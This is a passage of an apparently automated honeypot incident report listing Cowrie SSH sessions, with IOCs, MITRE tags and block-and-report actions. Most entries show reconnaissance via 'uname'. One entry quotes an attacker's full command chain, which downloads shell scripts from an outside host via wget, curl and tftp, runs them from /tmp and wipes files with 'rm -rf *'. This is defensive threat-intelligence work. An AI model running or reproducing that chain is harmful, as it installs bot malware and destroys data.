| `2026-09-27 12:56:33` | `cowrie.command.input` |
| `2026-09-27 12:56:33` | `cowrie.log.closed` |
| `2026-09-27 12:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccfa316d3d19

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:36` | `cowrie.session.connect` |
| `2026-09-27 12:56:36` | `cowrie.client.version` |
| `2026-09-27 12:56:36` | `cowrie.client.kex` |
| `2026-09-27 12:56:36` | `cowrie.login.success` |
| `2026-09-27 12:56:37` | `cowrie.session.params` |
| `2026-09-27 12:56:37` | `cowrie.command.input` |
| `2026-09-27 12:56:37` | `cowrie.log.closed` |
| `2026-09-27 12:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0fef22f388e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:41` | `cowrie.session.connect` |
| `2026-09-27 12:56:41` | `cowrie.client.version` |
| `2026-09-27 12:56:41` | `cowrie.client.kex` |
| `2026-09-27 12:56:41` | `cowrie.login.success` |
| `2026-09-27 12:56:42` | `cowrie.session.params` |
| `2026-09-27 12:56:42` | `cowrie.command.input` |
| `2026-09-27 12:56:43` | `cowrie.log.closed` |
| `2026-09-27 12:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-8845bf5ae7cc

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:43` | `cowrie.session.connect` |
| `2026-09-27 12:56:43` | `cowrie.login.success` |
| `2026-09-27 12:56:44` | `cowrie.session.params` |
| `2026-09-27 12:56:45` | `cowrie.command.input` |
| `2026-09-27 12:56:45` | `cowrie.command.input` |
| `2026-09-27 12:56:45` | `cowrie.session.file_download` |
| `2026-09-27 12:56:45` | `cowrie.session.file_download` |
| `2026-09-27 12:56:46` | `cowrie.session.file_download` |
| `2026-09-27 12:56:46` | `cowrie.session.file_download` |
| `2026-09-27 12:56:46` | `cowrie.session.file_download.failed` |
| `2026-09-27 12:56:46` | `cowrie.session.file_download` |
| `2026-09-27 12:56:46` | `cowrie.session.file_download` |
| `2026-09-27 12:57:00` | `cowrie.log.closed` |
| `2026-09-27 12:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a8954f768f4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:46` | `cowrie.session.connect` |
| `2026-09-27 12:56:46` | `cowrie.client.version` |
| `2026-09-27 12:56:46` | `cowrie.client.kex` |
| `2026-09-27 12:56:47` | `cowrie.login.success` |
| `2026-09-27 12:56:48` | `cowrie.session.params` |
| `2026-09-27 12:56:48` | `cowrie.command.input` |
| `2026-09-27 12:56:48` | `cowrie.log.closed` |
| `2026-09-27 12:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bef0af609f0a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:51` | `cowrie.session.connect` |
| `2026-09-27 12:56:51` | `cowrie.client.version` |
| `2026-09-27 12:56:51` | `cowrie.client.kex` |
| `2026-09-27 12:56:52` | `cowrie.login.success` |
| `2026-09-27 12:56:53` | `cowrie.session.params` |
| `2026-09-27 12:56:53` | `cowrie.command.input` |
| `2026-09-27 12:56:53` | `cowrie.log.closed` |
| `2026-09-27 12:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1999a4855b4f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:56` | `cowrie.session.connect` |
| `2026-09-27 12:56:56` | `cowrie.client.version` |
| `2026-09-27 12:56:56` | `cowrie.client.kex` |
| `2026-09-27 12:56:57` | `cowrie.login.success` |
| `2026-09-27 12:56:57` | `cowrie.session.params` |
| `2026-09-27 12:56:57` | `cowrie.command.input` |
| `2026-09-27 12:56:58` | `cowrie.log.closed` |
| `2026-09-27 12:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4194c640a164

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:01` | `cowrie.session.connect` |
| `2026-09-27 12:57:01` | `cowrie.client.version` |
| `2026-09-27 12:57:01` | `cowrie.client.kex` |
| `2026-09-27 12:57:01` | `cowrie.login.success` |
| `2026-09-27 12:57:02` | `cowrie.session.params` |
| `2026-09-27 12:57:02` | `cowrie.command.input` |
| `2026-09-27 12:57:02` | `cowrie.log.closed` |
| `2026-09-27 12:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f821b27b319a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:06` | `cowrie.session.connect` |
| `2026-09-27 12:57:06` | `cowrie.client.version` |
| `2026-09-27 12:57:06` | `cowrie.client.kex` |
| `2026-09-27 12:57:06` | `cowrie.login.success` |
| `2026-09-27 12:57:07` | `cowrie.session.params` |
| `2026-09-27 12:57:07` | `cowrie.command.input` |
| `2026-09-27 12:57:07` | `cowrie.log.closed` |
| `2026-09-27 12:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1dce14c813e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:11` | `cowrie.session.connect` |
| `2026-09-27 12:57:11` | `cowrie.client.version` |
| `2026-09-27 12:57:11` | `cowrie.client.kex` |
| `2026-09-27 12:57:11` | `cowrie.login.success` |
| `2026-09-27 12:57:12` | `cowrie.session.params` |
| `2026-09-27 12:57:12` | `cowrie.command.input` |
| `2026-09-27 12:57:12` | `cowrie.log.closed` |
| `2026-09-27 12:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31cb8ebc2e5a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:15` | `cowrie.session.connect` |
| `2026-09-27 12:57:15` | `cowrie.client.version` |
| `2026-09-27 12:57:16` | `cowrie.client.kex` |
| `2026-09-27 12:57:16` | `cowrie.login.success` |
| `2026-09-27 12:57:17` | `cowrie.session.params` |
| `2026-09-27 12:57:17` | `cowrie.command.input` |
| `2026-09-27 12:57:17` | `cowrie.log.closed` |
| `2026-09-27 12:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9cd0d9bea6d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:20` | `cowrie.session.connect` |
| `2026-09-27 12:57:20` | `cowrie.client.version` |
| `2026-09-27 12:57:20` | `cowrie.client.kex` |
| `2026-09-27 12:57:21` | `cowrie.login.success` |
| `2026-09-27 12:57:21` | `cowrie.session.params` |
| `2026-09-27 12:57:21` | `cowrie.command.input` |
| `2026-09-27 12:57:22` | `cowrie.log.closed` |
| `2026-09-27 12:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c61205db96

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:25` | `cowrie.session.connect` |
| `2026-09-27 12:57:25` | `cowrie.client.version` |
| `2026-09-27 12:57:25` | `cowrie.client.kex` |
| `2026-09-27 12:57:26` | `cowrie.login.success` |
| `2026-09-27 12:57:26` | `cowrie.session.params` |
| `2026-09-27 12:57:26` | `cowrie.command.input` |
| `2026-09-27 12:57:27` | `cowrie.log.closed` |
| `2026-09-27 12:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-762019f2d219

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:30` | `cowrie.session.connect` |
| `2026-09-27 12:57:30` | `cowrie.client.version` |
| `2026-09-27 12:57:30` | `cowrie.client.kex` |
| `2026-09-27 12:57:31` | `cowrie.login.success` |
| `2026-09-27 12:57:32` | `cowrie.session.params` |
| `2026-09-27 12:57:32` | `cowrie.command.input` |
| `2026-09-27 12:57:32` | `cowrie.log.closed` |
| `2026-09-27 12:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da89304df183

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:35` | `cowrie.session.connect` |
| `2026-09-27 12:57:35` | `cowrie.client.version` |
| `2026-09-27 12:57:35` | `cowrie.client.kex` |
| `2026-09-27 12:57:36` | `cowrie.login.success` |
| `2026-09-27 12:57:37` | `cowrie.session.params` |
| `2026-09-27 12:57:37` | `cowrie.command.input` |
| `2026-09-27 12:57:37` | `cowrie.log.closed` |
| `2026-09-27 12:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36bf9aa85744

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:40` | `cowrie.session.connect` |
| `2026-09-27 12:57:40` | `cowrie.client.version` |
| `2026-09-27 12:57:40` | `cowrie.client.kex` |
| `2026-09-27 12:57:40` | `cowrie.login.success` |
| `2026-09-27 12:57:41` | `cowrie.session.params` |
| `2026-09-27 12:57:41` | `cowrie.command.input` |
| `2026-09-27 12:57:41` | `cowrie.log.closed` |
| `2026-09-27 12:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c41226f489

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:45` | `cowrie.session.connect` |
| `2026-09-27 12:57:45` | `cowrie.client.version` |
| `2026-09-27 12:57:45` | `cowrie.client.kex` |
| `2026-09-27 12:57:45` | `cowrie.login.success` |
| `2026-09-27 12:57:46` | `cowrie.session.params` |
| `2026-09-27 12:57:46` | `cowrie.command.input` |
| `2026-09-27 12:57:46` | `cowrie.log.closed` |
| `2026-09-27 12:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f562f19406e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:50` | `cowrie.session.connect` |
| `2026-09-27 12:57:50` | `cowrie.client.version` |
| `2026-09-27 12:57:50` | `cowrie.client.kex` |
| `2026-09-27 12:57:51` | `cowrie.login.success` |
| `2026-09-27 12:57:52` | `cowrie.session.params` |
| `2026-09-27 12:57:52` | `cowrie.command.input` |
| `2026-09-27 12:57:52` | `cowrie.log.closed` |
| `2026-09-27 12:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77dfed561201

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:57 |
| **Last Seen** | 2026-09-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:57:55` | `cowrie.session.connect` |
| `2026-09-27 12:57:55` | `cowrie.client.version` |
| `2026-09-27 12:57:55` | `cowrie.client.kex` |
| `2026-09-27 12:57:56` | `cowrie.login.success` |
| `2026-09-27 12:57:56` | `cowrie.session.params` |
| `2026-09-27 12:57:56` | `cowrie.command.input` |
| `2026-09-27 12:57:56` | `cowrie.log.closed` |
| `2026-09-27 12:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6f704524afa

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:00` | `cowrie.session.connect` |
| `2026-09-27 12:58:00` | `cowrie.client.version` |
| `2026-09-27 12:58:00` | `cowrie.client.kex` |
| `2026-09-27 12:58:00` | `cowrie.login.success` |
| `2026-09-27 12:58:01` | `cowrie.session.params` |
| `2026-09-27 12:58:01` | `cowrie.command.input` |
| `2026-09-27 12:58:01` | `cowrie.log.closed` |
| `2026-09-27 12:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b906b8f0a3ab

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:05` | `cowrie.session.connect` |
| `2026-09-27 12:58:05` | `cowrie.client.version` |
| `2026-09-27 12:58:05` | `cowrie.client.kex` |
| `2026-09-27 12:58:05` | `cowrie.login.success` |
| `2026-09-27 12:58:06` | `cowrie.session.params` |
| `2026-09-27 12:58:06` | `cowrie.command.input` |
| `2026-09-27 12:58:06` | `cowrie.log.closed` |
| `2026-09-27 12:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0dabcb12cc6

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:09` | `cowrie.session.connect` |
| `2026-09-27 12:58:09` | `cowrie.client.version` |
| `2026-09-27 12:58:09` | `cowrie.client.kex` |
| `2026-09-27 12:58:10` | `cowrie.login.success` |
| `2026-09-27 12:58:11` | `cowrie.session.params` |
| `2026-09-27 12:58:11` | `cowrie.command.input` |
| `2026-09-27 12:58:11` | `cowrie.log.closed` |
| `2026-09-27 12:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53ce31d5a54

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:14` | `cowrie.session.connect` |
| `2026-09-27 12:58:14` | `cowrie.client.version` |
| `2026-09-27 12:58:14` | `cowrie.client.kex` |
| `2026-09-27 12:58:15` | `cowrie.login.success` |
| `2026-09-27 12:58:16` | `cowrie.session.params` |
| `2026-09-27 12:58:16` | `cowrie.command.input` |
| `2026-09-27 12:58:16` | `cowrie.log.closed` |
| `2026-09-27 12:58:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8f48577eb6a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:19` | `cowrie.session.connect` |
| `2026-09-27 12:58:19` | `cowrie.client.version` |
| `2026-09-27 12:58:19` | `cowrie.client.kex` |
| `2026-09-27 12:58:20` | `cowrie.login.success` |
| `2026-09-27 12:58:20` | `cowrie.session.params` |
| `2026-09-27 12:58:20` | `cowrie.command.input` |
| `2026-09-27 12:58:20` | `cowrie.log.closed` |
| `2026-09-27 12:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8135a5b4292

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:24` | `cowrie.session.connect` |
| `2026-09-27 12:58:24` | `cowrie.client.version` |
| `2026-09-27 12:58:24` | `cowrie.client.kex` |
| `2026-09-27 12:58:25` | `cowrie.login.success` |
| `2026-09-27 12:58:26` | `cowrie.session.params` |
| `2026-09-27 12:58:26` | `cowrie.command.input` |
